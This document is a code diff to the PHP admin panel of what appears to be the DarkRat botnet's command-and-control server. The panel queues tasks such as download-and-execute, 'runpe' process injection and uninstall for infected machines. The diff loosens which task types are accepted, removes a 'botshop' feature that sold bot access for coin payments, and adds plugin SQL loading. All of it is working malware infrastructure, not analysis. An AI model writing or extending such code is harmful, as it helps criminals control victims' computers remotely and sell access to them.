@@ -203,7 +203,7 @@ class Main{
                 if($_POST["task"] == "uninstall") {
                     $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task, execution_limit) VALUES (?, ?, ?, ?, ?)");
                     $statement->execute(array(json_encode($filter), 1, 'uninstall', $_POST["task"], $exectionLimit));
-                } elseif($_POST["task"] == "dande" || $_POST["task"] == "update" || $_POST["task"] == "runpe") {
+                }else{
                     if(empty($_POST["command"])){
                         die("Please Input a Command");
                     }
@@ -361,20 +361,8 @@ class Main{
           //  die();
 
 
-            //Botshop
-            //case when kind = 1 then 1 else 0 end
-            // sum(IFNULL( case when botshop_orders.payed = 1 then botshop_orders.coinstopay else 0 end, 0))
-            $statementConfig = $GLOBALS["pdo"]->prepare("SELECT SUM(CASE When botshop_orders.payed=1 Then botshop_orders.coinstopay Else 0 End ) as profit, botshop_access.apikey, botshop_access.id, users.username 
-                                                         FROM botshop_access 
-                                                         LEFT JOIN users ON users.id = botshop_access.created_by_userid 
-                                                         LEFT JOIN botshop_orders ON botshop_orders.from_access_api = botshop_access.apikey
-                                                          WHERE botshop_access.active = ? group by botshop_access.apikey");
-            $statementConfig->execute(array(1));
-            $botshopAccessList = $statementConfig->fetchAll();
 
-
-
-           if(!empty($_POST)){
+            if(!empty($_POST)){
                 if(!empty($_POST["pluginChanger"])){
                     $activePlugins = explode(",",$config["plugins"]);
                     if(!in_array($_POST["pluginChanger"],$activePlugins)){
@@ -384,6 +372,11 @@ class Main{
                     }else{
                         $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET plugins = ? WHERE id = ?");
                         $statement->execute(array(str_replace($_POST["pluginChanger"],"",$config["plugins"]),1));
+                    }
+
+                    if(file_exists(__DIR__."/../../../plugins/".$_POST["pluginChanger"]."/".$_POST["pluginChanger"].".sql")){
+                       $sql = file_get_contents(__DIR__."/../../../plugins/".$_POST["pluginChanger"]."/".$_POST["pluginChanger"].".sql");
+                       $GLOBALS["pdo"]->query($sql);
                     }
                 }
                 if(!empty($_POST["changeTemplate"])){
@@ -425,15 +418,7 @@ class Main{
                     }
                 }
 
-                if(!empty($_POST["create_new_shop_api"])){
-                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_access (created_by_userid, apikey) VALUES (:userid, :apikey)");
-                    $statement->execute(array('userid' => $_SESSION["darkrat_userid"], 'apikey' => $this->random_string()));
-                }
 
-                if(!empty($_POST["deleteapi"])){
-                    $statement =  $GLOBALS["pdo"]->prepare("DELETE FROM botshop_access WHERE id = ?");
-                    $statement->execute(array($_POST["deleteapi"]));
-                }
 
                 if(!empty($_POST["encrypt"])){
                     $handler = new BotHandler();
@@ -449,7 +434,7 @@ class Main{
             $GLOBALS["tpl"]->assign("config", $config);
             $GLOBALS["tpl"]->assign("templates", $templates);
             $GLOBALS["tpl"]->assign("encryptedOUT", $encryptedOUT);
-            $GLOBALS["tpl"]->assign("botshopAccessList", $botshopAccessList);
+
             $GLOBALS["tpl"]->assign("foundPlugins", $GLOBALS["foundPlugins"]);
         }
 
